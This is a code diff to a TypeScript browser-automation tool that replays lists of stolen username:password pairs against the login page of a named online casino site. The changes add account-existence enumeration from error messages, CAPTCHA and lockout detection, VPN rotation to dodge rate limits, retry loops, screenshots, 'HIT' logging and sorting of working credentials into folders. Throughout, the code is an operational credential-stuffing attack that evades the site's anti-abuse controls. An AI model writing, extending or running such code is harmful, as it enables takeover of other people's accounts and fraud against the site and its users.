@@ -12,12 +12,22 @@ import { initProxies, rotate, recordSuccess as vpnSuccess, recordFail as vpnFail
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 
+export type LoginOutcome = "success" | "wrong_credentials" | "rate_limited" | "account_locked" | "captcha_block" | "2fa_required" | "unknown";
+
+export interface DetailedOutcome {
+  outcome: LoginOutcome;
+  accountExists: boolean;
+  message?: string;
+}
+
 export interface LoginAttempt {
   url:       string;
   username:  string;
   timestamp: string;
   success:   boolean;
-  reason:    string;       // e.g. "redirect", "dashboard_keyword", "error_keyword", "timeout"
+  outcome:   LoginOutcome;
+  accountExists: boolean;
+  reason:    string;
   tunnel:    string | null;
   durationMs: number;
 }
@@ -49,6 +59,8 @@ export function loadCreds(filePath: string = './creds.txt'): Array<{ username: s
 
 const LOGIN_LOG = './login_results.json';
 
+const TXT_LOG = './login_results.txt';
+
 function appendResult(attempt: LoginAttempt): void {
   let logs: LoginAttempt[] = [];
   try {
@@ -58,42 +70,121 @@ function appendResult(attempt: LoginAttempt): void {
   }
   logs.push(attempt);
   fs.writeFileSync(LOGIN_LOG, JSON.stringify(logs, null, 2));
+
+  // Also append to simple plain text file
+  const textLine = `[${attempt.timestamp}] ${attempt.username} | ${attempt.outcome} | Exists: ${attempt.accountExists} | Reason: ${attempt.reason} | VPN: ${attempt.tunnel}\n`;
+  fs.appendFileSync(TXT_LOG, textLine);
 }
 
-// ─── Success detection ────────────────────────────────────────────────────────
+// ─── Post-Submit Outcome Detection ───────────────────────────────────────────
 
-// Keywords in the URL or page text that indicate a successful login
-const SUCCESS_URL_KEYWORDS    = ['dashboard', 'lobby', 'home', 'account', 'member', 'profile', 'welcome', 'portal'];
-const SUCCESS_TEXT_KEYWORDS   = ['welcome', 'log out', 'logout', 'my account', 'balance', 'deposit', 'withdraw'];
-const FAIL_TEXT_KEYWORDS      = ['invalid', 'incorrect', 'wrong password', 'failed', 'error', 'not found',
-                                  'too many', 'blocked', 'suspended', 'captcha'];
+const SIGNALS = {
+  failure: {
+    keywords: [
+      "invalid", "incorrect", "wrong password", "doesn't match",
+      "not recognized", "not recognised", "account not found",
+      "does not exist", "try again", "unable to log in"
+    ],
+    selectors: [
+      '[class*="error-message"]', '[class*="alert-danger"]',
+      '[class*="alert--error"]', '[role="alert"]',
+      '[class*="invalid-feedback"]', '.ol-alert'
+    ]
+  },
+  rateLimit: {
+    warning: ["further failed attempts may result", "account being blocked"],
+    lockout: [
+      "too many attempts", "rate limit", "temporarily locked",
+      "temporarily disabled", "account locked", "account has been",
+      "try again later", "blocked", "suspended", "re-enable", "account disabled"
+    ]
+  },
+  captcha: ["recaptcha", "grecaptcha", "hcaptcha", "cf-turnstile", "arkoselabs", "geetest"]
+};
 
-async function detectOutcome(page: Page, originalUrl: string): Promise<{ success: boolean; reason: string }> {
+async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedOutcome> {
   await page.waitForTimeout(randDelay(2000, 4000));
+  
+  const postSubmitUrl = page.url();
+  const bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
+  const html = (await page.content().catch(() => '')).toLowerCase();
+  const urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();
 
-  const currentUrl = page.url().toLowerCase();
-  const bodyText   = ((await page.textContent('body')) ?? '').toLowerCase();
-
-  // URL changed away from login page = likely success
-  if (currentUrl !== originalUrl.toLowerCase() &&
-      !currentUrl.includes('login') && !currentUrl.includes('error')) {
-    for (const kw of SUCCESS_URL_KEYWORDS) {
-      if (currentUrl.includes(kw)) return { success: true, reason: `url:${kw}` };
+  // 1. CAPTCHA Detection
+  // Only trigger if a CAPTCHA iframe or known element is actually visible and takes up real estate,
+  // to avoid false positives from site-wide invisible tracking scripts.
+  let hasCaptcha = false;
+  
+  if (bodyText.includes("solve the captcha") || bodyText.includes("verify you are human") || bodyText.includes("complete the captcha")) {
+    hasCaptcha = true;
+  } else {
+    // Check iframes matching SIGNALS strings
+    for (const frame of page.frames()) {
+      const url = frame.url().toLowerCase();
+      if (SIGNALS.captcha.some(p => url.includes(p))) {
+        const fElement = await frame.frameElement().catch(() => null);
+        if (fElement) {
+          const isVisible = await fElement.isVisible().catch(() => false);
+          const box = await fElement.boundingBox().catch(() => null);
+          // Invisible trackers are very small, real challenges are large modals
+          if (isVisible && box && box.width > 200 && box.height > 60) {
+            hasCaptcha = true;
+            break;
+          }
+        }
+      }
     }
-    // URL changed but no known success keyword — still likely success
-    return { success: true, reason: 'url_changed' };
   }
 
-  for (const kw of SUCCESS_TEXT_KEYWORDS) {
-    if (bodyText.includes(kw)) return { success: true, reason: `text:${kw}` };
+  if (hasCaptcha) {
+    return { outcome: 'captcha_block', accountExists: true, message: 'Visible CAPTCHA challenge detected' };
   }
 
-  for (const kw of FAIL_TEXT_KEYWORDS) {
-    if (bodyText.includes(kw)) return { success: false, reason: `fail_text:${kw}` };
+  // 2. Rate Limit & Lockout Detection (Priority over standard failure)
+  const lockoutMsg = SIGNALS.rateLimit.lockout.find(s => bodyText.includes(s));
+  const warningMsg = SIGNALS.rateLimit.warning.find(s => bodyText.includes(s));
+
+  if (lockoutMsg) return { outcome: 'account_locked', accountExists: true, message: lockoutMsg };
+  if (warningMsg) return { outcome: 'rate_limited', accountExists: true, message: warningMsg };
+
+  // 3. Standard Failure Detection
+  const failureMsg = SIGNALS.failure.keywords.find(s => bodyText.includes(s));
+  
+  // Check visible error selectors
+  let hasVisibleError = false;
+  for (const selector of SIGNALS.failure.selectors) {
+    const locator = page.locator(selector).first();
+    if (await locator.isVisible().catch(() => false)) {
+      hasVisibleError = true;
+      break;
+    }
   }
 
-  // Still on login page, no clear signal
-  return { success: false, reason: 'no_signal' };
+  if (failureMsg || hasVisibleError) {
+    // Determine if account exists: "incorrect" implies existence, 
+    // "not found" or "does not exist" implies it doesn't.
+    const notFound = bodyText.includes("not found") || bodyText.includes("does not exist");
+    return { 
+      outcome: 'wrong_credentials', 
+      accountExists: !notFound,
+      message: failureMsg || 'visible error selector triggered'
+    };
+  }
+
+  // 4. THE NEGATIVE SELECTION RULE: Default to Success
+  // We assume success if no failure signals exist and we aren't stuck on the login URL
+  const onLoginPath = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');
+  
+  if (urlChanged || !onLoginPath) {
+    return { 
+      outcome: 'success', 
+      accountExists: true, 
+      message: `Navigated successfully to: ${postSubmitUrl.split('?')[0]}` 
+    };
+  }
+
+  // Fallback if we are still on the login page but no errors are visible
+  return { outcome: 'unknown', accountExists: false, message: 'no clear signals found' };
 }
 
 // ─── Single login attempt ─────────────────────────────────────────────────────
@@ -104,7 +195,7 @@ async function attemptLogin(
   selectors: ScanResult['selectors'],
   username: string,
   password: string
-): Promise<{ success: boolean; reason: string }> {
+): Promise<DetailedOutcome> {
 
   // Build selectors (same robust logic as scanner)
   const usernameEl = selectors.find((s: any) => s.role === 'username_field');
@@ -119,19 +210,70 @@ async function attemptLogin(
 
   const usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
   const passwordCss = buildSel(passwordEl, 'input[type="password"]');
-  const submitCss   = buildSel(submitEl,   'button[type="submit"]');
+  const submitCss   = '#loginSubmit';
 
   await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
   await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
   await simulateHuman(page);
 
+  try {
+    const loginNavBtn = 'body > div.ol-pos_sticky.ol-top_0.ol-z_docked > div > header > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__loggedOut.ol-headerRight__loggedOut--variant_center.ol-headerRight__loggedOut--size_lg > div > a';
+    if (await page.isVisible(loginNavBtn)) {
+      await page.click(loginNavBtn, { timeout: 5000 });
+      await page.waitForTimeout(2000);
+    } else {
+      const genericBtn = await page.$('a:has-text("Login"), button:has-text("Login")');
+      if (genericBtn && await genericBtn.isVisible()) {
+        await genericBtn.click();
+        await page.waitForTimeout(2000);
+      }
+    }
+  } catch (e) {}
+
   await humanType(page, usernameCss, username);
   await page.waitForTimeout(randDelay(300, 700));
-  await humanType(page, passwordCss, password);
-  await page.waitForTimeout(randDelay(200, 600));
-  await page.click(submitCss);
 
-  return detectOutcome(page, url);
+  let lastOutcome: DetailedOutcome | null = null;
+  const errorStrs: string[] = [];
+
+  for (let attemptNum = 1; attemptNum <= 3; attemptNum++) {
+    // Restore the password string in case the web form wipes the field on failure
+    const passLoc = page.locator(passwordCss).first();
+    if (await passLoc.isVisible().catch(() => false)) {
+      await passLoc.fill('');
+      await humanType(page, passwordCss, password);
+      await page.waitForTimeout(randDelay(200, 400));
+    }
+
+    await page.click(submitCss);
+    lastOutcome = await detectOutcome(page, url);
+
+    // Stop spamming if we succeeded, got asked for an auth code, or hit a brick captcha
+    if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required' || lastOutcome.outcome === 'captcha_block') {
+      break;
+    }
+
+    // "unless initial login error is account disabled"
+    if (lastOutcome.outcome === 'account_locked') {
+      // Record whatever locked message we found and bail out immediately
+      if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
+        errorStrs.push(lastOutcome.message);
+      }
+      break;
+    }
+
+    // Keep accumulating unique escalating errors on loop
+    if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
+      errorStrs.push(lastOutcome.message);
+    }
+  }
+
+  // Bind the sequence of error strings to the reason so it prints elegantly 
+  if (lastOutcome! && errorStrs.length > 0 && lastOutcome!.outcome !== 'success') {
+    lastOutcome!.message = errorStrs.join(' -> ');
+  }
+
+  return lastOutcome!;
 }
 
 // ─── Is block/rate-limit error? ───────────────────────────────────────────────
@@ -147,17 +289,17 @@ function isBlockError(msg: string): boolean {
 // ─── Main automation loop ─────────────────────────────────────────────────────
 
 export async function runLoginAuto(
-  targetUrl:  string = 'https://joefortunepokies.win/login',
+  targetUrl:  string = 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x',
   credsFile:  string = './creds.txt',
   options: {
     delayBetweenMs?: [number, number]; // [min, max] delay between attempts
-    rotateEvery?:    number;            // rotate VPN every N attempts (1 = every cred)
+    rotateEvery?:    number;            // rotate VPN every N attempts (0 = only on block)
     stopOnSuccess?:  boolean;           // stop after first working cred
   } = {}
 ): Promise<void> {
   const {
     delayBetweenMs = [4000, 10000],
-    rotateEvery    = 1,
+    rotateEvery    = 0,
     stopOnSuccess  = false,
   } = options;
 
@@ -221,8 +363,8 @@ export async function runLoginAuto(
   for (let i = 0; i < creds.length; i++) {
     const { username, password } = creds[i];
 
-    // Rotate VPN based on rotateEvery setting (default 1 = every cred)
-    if (i > 0 && i % rotateEvery === 0) {
+    // Rotate VPN based on rotateEvery setting (default 0 = only rotate on blocks)
+    if (rotateEvery > 0 && i > 0 && i % rotateEvery === 0) {
       console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
       activeVpn = rotate();
       if (!activeVpn) {
@@ -254,6 +396,8 @@ export async function runLoginAuto(
       username,
       timestamp:  new Date().toISOString(),
       success:    false,
+      outcome:    'unknown',
+      accountExists: false,
       reason:     '',
       tunnel:     vpnName,
       durationMs: 0,
@@ -261,18 +405,29 @@ export async function runLoginAuto(
 
     try {
       const outcome = await attemptLogin(page, targetUrl, selectors, username, password);
-      attempt.success    = outcome.success;
-      attempt.reason     = outcome.reason;
+      
+      attempt.success    = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
+      attempt.outcome    = outcome.outcome;
+      attempt.accountExists = outcome.accountExists;
+      attempt.reason     = outcome.message || outcome.outcome;
       attempt.durationMs = Date.now() - t0;
 
-      if (outcome.success) {
-        console.log(`[auto] ✓ HIT: ${username}:${password} (${outcome.reason})`);
+      // Ensure screenshot is taken for ALL attempts to record exact state
+      await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});
+
+      if (attempt.success) {
+        console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
         if (activeVpn) vpnSuccess(activeVpn);
         succeeded++;
         hits.push(attempt);
-        await page.screenshot({ path: `./hit_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true });
       } else {
-        console.log(`[auto] ✗ miss: ${username} (${outcome.reason})`);
+        console.log(`[auto] ✗ miss: ${username} (${attempt.reason})`);
+        
+        if (outcome.outcome === 'rate_limited' || outcome.outcome === 'captcha_block') {
+          console.warn(`[auto] Blocked by ${outcome.outcome} on ${vpnName} — rotating VPN...`);
+          if (activeVpn) vpnFail(activeVpn);
+          activeVpn = rotate();
+        }
       }
 
     } catch (err: any) {
@@ -288,6 +443,40 @@ export async function runLoginAuto(
     }
 
     appendResult(attempt);
+
+    // ── Sort and remove consumed credential ──
+    try {
+      const lReason = attempt.reason.toLowerCase();
+      const parts = lReason.split(' -> ');
+      const initErr = parts[0] || '';
+      const finalErr = parts[parts.length - 1] || '';
+
+      let targetFolder = 'success';
+      if (finalErr.includes('remains locked')) {
+        targetFolder = 'no_account';
+      } else if (finalErr.includes('temp disabled') || finalErr.includes('temporarily disabled')) {
+        targetFolder = 'temp_disabled';
+      } else if (initErr.includes('your account is disabled')) {
+        targetFolder = 'disabled';
+      } else {
+        targetFolder = 'success';
+      }
+
+      const tPath = `./${targetFolder}`;
+      if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
+      fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);
+
+      // Remove from main creds.txt securely
+      const rawCreds = fs.readFileSync(credsFile, 'utf8');
+      const filtered = rawCreds.split('\n').filter(l => {
+        if (!l.trim() || l.trim().startsWith('#')) return true; // keep empty lines & comments
+        return !(l.includes(username) && l.includes(password));
+      });
+      fs.writeFileSync(credsFile, filtered.join('\n'));
+    } catch(e) {
+      console.error(`[auto] Failed to sort/remove credential:`, e);
+    }
+
     await browser.close();
     attempted++;
 
@@ -329,7 +518,7 @@ process.on('SIGTERM', cleanup);
 
 // ── Allow direct execution ────────────────────────────────────────────────────
 if (require.main === module) {
-  const url = process.argv[2] || 'https://joefortunepokies.win/login';
+  const url = process.argv[2] || 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x';
   runLoginAuto(url)
     .then(() => { vpnDown(); })
     .catch(e => { console.error(e); vpnDown(); process.exit(1); });
